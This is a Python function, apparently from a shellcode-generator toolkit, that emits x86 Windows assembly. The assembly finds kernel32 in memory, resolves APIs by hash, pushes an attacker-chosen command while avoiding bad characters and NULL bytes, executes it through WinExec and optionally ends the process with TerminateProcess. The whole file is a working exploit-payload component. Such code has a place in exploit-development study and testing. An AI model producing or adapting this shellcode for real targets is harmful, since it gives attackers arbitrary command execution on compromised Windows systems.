from coder.util import find_and_call, find_kernel32, push_hash, push_string


def generate(cmd, bad_chars, no_terminate_process=False, debug=False):
    return f"""
    start:
        {'int3' if debug else ''}       // Breakpoint for Windbg
        mov   ebp, esp
        add   esp, 0xfffff9f0           // Avoid NULL bytes

    {find_kernel32()}

    {find_and_call()}

    create_cmd_string:
        {push_string(cmd, bad_chars)}
        mov ecx, esp

    call_winexec:                       // UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT uCmdShow);
        xor   edx, edx                  // edx = 0
        push  edx                       // uCmdShow = NULL
        push  ecx                       // lpCmdLine = &(cmd)
        {push_hash('WinExec')}          // WinExec hash
        call dword ptr [ebp+0x04]       // Call WinExec

    {
    f'''
    call_terminateprocess:              // BOOL TerminateProcess([in] HANDLE hProcess, [in] UINT uExitCode);
        xor   ecx, ecx                  // ECX = 0
        push  ecx                       // uExitCode = 0
        push  0xffffffff                // hProcess = 0xffffffff
        {push_hash('TerminateProcess')} // TerminateProcess hash
        call dword ptr [ebp+0x04]       // Call TerminateProcess
    ''' if not no_terminate_process else ''
    }
    """
